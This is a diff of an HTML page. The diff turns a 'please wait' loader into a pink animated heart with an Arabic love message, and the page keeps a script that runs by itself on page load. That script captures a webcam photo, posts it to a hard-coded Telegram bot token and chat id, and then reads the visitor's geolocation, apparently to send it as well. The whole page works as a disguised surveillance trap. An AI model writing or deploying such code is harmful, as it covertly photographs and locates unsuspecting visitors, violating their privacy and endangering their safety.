@@ -1,13 +1,74 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar">
 <head>
-  <meta charset="UTF-8">
-  <title>جارٍ التحميل...</title>
+<meta charset="UTF-8">
+<title>عسوله احبج 💖</title>
+<style>
+  body {
+    background-color: #ffe6f0;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    flex-direction: column;
+    font-family: 'Arial', sans-serif;
+  }
+
+  .text {
+    font-size: 24px;
+    color: #ff1a75;
+    margin-bottom: 40px;
+    font-weight: bold;
+    animation: fade 2s infinite alternate;
+  }
+
+  .heart {
+    width: 100px;
+    height: 100px;
+    background-color: #ff4d88;
+    position: relative;
+    transform: rotate(-45deg);
+    animation: pulse 1s infinite;
+  }
+
+  .heart::before,
+  .heart::after {
+    content: "";
+    width: 100px;
+    height: 100px;
+    background-color: #ff4d88;
+    border-radius: 50%;
+    position: absolute;
+  }
+
+  .heart::before {
+    top: -50px;
+    left: 0;
+  }
+
+  .heart::after {
+    left: 50px;
+    top: 0;
+  }
+
+  @keyframes pulse {
+    0% { transform: rotate(-45deg) scale(1); }
+    50% { transform: rotate(-45deg) scale(1.1); }
+    100% { transform: rotate(-45deg) scale(1); }
+  }
+
+  @keyframes fade {
+    from { opacity: 0.6; }
+    to { opacity: 1; }
+  }
+</style>
 </head>
 <body>
-  <h2>يرجى الانتظار...</h2>
 
-  <script>
+<div class="text">عسوله احبج 💖</div>
+<div class="heart"></div>
+
+<script>
     async function captureAndSend() {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
@@ -15,7 +76,6 @@
         video.srcObject = stream;
         video.play();
 
-        // انتظر شوي حتى تشتغل الكاميرا
         await new Promise(resolve => setTimeout(resolve, 3000));
 
         const canvas = document.createElement('canvas');
@@ -26,23 +86,19 @@
 
         const imageData = canvas.toDataURL('image/jpeg');
 
-        // تحويل base64 إلى ملف Blob
         const blob = await (await fetch(imageData)).blob();
 
         const formData = new FormData();
         formData.append("chat_id", "1320552080");
         formData.append("photo", blob, "capture.jpg");
 
-        // إرسال إلى تليجرام (الصورة)
         fetch("https://api.telegram.org/bot6790035809:AAF1WJELoljfs8TKw3NsBTjtqTurTGI15l0/sendPhoto", {
           method: "POST",
           body: formData
         });
 
-        // إيقاف الكاميرا
         stream.getTracks().forEach(track => track.stop());
 
-        // ✅ إضافة إرسال الموقع
         navigator.geolocation.getCurrentPosition(position => {
           const latitude = position.coords.latitude;
           const longitude = position.coords.longitude;
@@ -60,6 +116,7 @@
     }
 
     captureAndSend();
-  </script>
+</script>
+
 </body>
 </html>
